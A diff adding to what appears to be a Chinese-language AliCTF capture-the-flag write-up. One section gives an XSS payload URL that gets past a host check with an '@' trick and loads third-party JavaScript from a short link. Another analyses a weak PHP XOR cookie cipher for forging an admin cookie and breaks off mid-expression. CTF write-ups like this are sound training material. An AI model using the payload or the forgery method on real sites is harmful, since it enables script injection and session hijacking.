@@ -230,3 +230,65 @@ http://monster.alictf.com/subject/wireless/alictf.html
 
 综上所述：key 为 getActivity;openFile;loadDataWithBaseURL.
 p.s: 审计代码没搞多久，拼接答案搞了半天 o(╯□╰)o。
+
+
+
+#前端初赛题3
+
+分析了一下代码  
+主要看到这里就行
+
+		if(this.authority != 'notexist.example.com'){
+    	    this.illegal = true;
+        	return;
+      	}
+      
+这个和上年那个http的题目差不多,上年的@加到后面,其实加到前面也是可以的  
+然后就可以调用第三方的js~
+>payload:
+>http://ef4c3e7556641f00.alictf.com/xss.php?http://@notexist.example.com:@t.cn/RAbdNcS
+##吐槽:这题太简单啊=w=
+
+
+
+#简单业务逻辑2
+
+分析代码 
+因为md5是不知道的 但是这样也能算出cookie 所以这段肯定是多余没有意义的
+删掉多余代码之后,代码变成这样
+
+      function encrypt($plain) {
+        $plain = md5($plain);
+        $rnd = md5(substr(microtime(),11));
+        $cipher = '';
+        for($i = 0; $i < strlen($plain); $i++) {    
+            $cipher .= ($plain[$i] ^ $rnd[$i]);
+        }
+        $cipher .= $rnd;
+        return str_replace('=', '', base64_encode($cipher));
+    }
+
+    function decrypt($cipher) {
+        $cipher_1 = base64_decode($cipher);
+        if (strlen($cipher_1)!=64){ //判断是否64位
+        return 'xx';
+        }
+        $plain = $cipher_1;
+        $ran = substr($plain,32,32);    //取后32位
+
+        $plain = substr($plain,0,32);   //取前32位
+        for ($i = 0; $i < strlen($ran); $i++) {     //使用异或覆盖前32位
+            $plain[$i] = ($plain[$i] ^ $ran[$i]);
+        }
+        return $plain;
+    }
+
+我们echo echo decrypt(encrypt($cookie);发现是"Guest"的值  
+猜测后端是 
+
+	if( md5($cookie)){
+		分配登录角色	
+	}
+	
+decrypt("YzMyazFhN2RjYDE7NDU2NmJnNTc8bWQyZDs9ZGtrMD5TVldWUwIIUgIFBgRUUAJRUQVVVwsHBlBSUFYECgpXVw")^$admin[$i].$plain
+
